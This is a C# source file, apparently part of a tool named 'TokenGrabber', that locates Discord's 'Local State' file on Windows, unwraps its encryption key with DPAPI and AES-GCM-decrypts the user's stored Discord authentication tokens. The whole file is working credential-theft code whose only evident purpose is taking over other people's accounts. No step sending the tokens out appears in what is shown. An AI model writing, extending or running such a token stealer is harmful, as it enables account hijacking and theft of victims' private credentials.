namespace TokenGrabber.Discord;

using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

internal static class TokenDecryptor
{
    private const int GcmNonceSize = 12;
    private const int GcmTagSize = 16;

    public static string? TryDecrypt(string encryptedToken)
    {
        if (string.IsNullOrEmpty(encryptedToken))
            return null;

        if (!encryptedToken.StartsWith("dQw4w9WgXcQ:"))
            return encryptedToken;

        var encrypted = Convert.FromBase64String(encryptedToken[12..]);
        var masterKey = GetDiscordMasterKey();

        if (masterKey is null || encrypted.Length < GcmNonceSize + GcmTagSize)
            return null;

        var nonce = encrypted[..GcmNonceSize];
        var ciphertext = encrypted[GcmNonceSize..^GcmTagSize];
        var tag = encrypted[^GcmTagSize..];

        var plaintext = new byte[ciphertext.Length];
        using var aes = new AesGcm(masterKey, GcmTagSize);
        aes.Decrypt(nonce, ciphertext, tag, plaintext);

        return Encoding.UTF8.GetString(plaintext);
    }

    private static byte[]? GetDiscordMasterKey()
    {
        var localStatePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "discord", "Local State");

        if (!File.Exists(localStatePath))
            return null;

        var json = File.ReadAllText(localStatePath);
        var doc = JsonDocument.Parse(json);

        if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt))
            return null;

        if (!osCrypt.TryGetProperty("encrypted_key", out var keyProp))
            return null;

        var encryptedKey = Convert.FromBase64String(keyProp.GetString()!);
        var keyBytes = encryptedKey[5..];

        return ProtectedData.Unprotect(keyBytes, null, DataProtectionScope.CurrentUser);
    }
}
